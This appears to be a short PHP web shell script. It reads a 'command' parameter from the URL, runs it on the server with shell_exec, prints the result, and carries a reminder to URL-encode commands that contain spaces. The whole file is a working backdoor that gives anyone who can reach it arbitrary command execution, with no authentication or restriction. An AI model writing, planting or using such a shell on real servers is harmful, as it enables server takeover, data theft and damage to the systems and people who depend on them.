<?php

// get the command passed to him
$command = $_GET['command'];

// Execute the command 
$result = shell_exec($command);

echo $result ;

// Note to myself : for the commands with space, don't forget to URL encode them
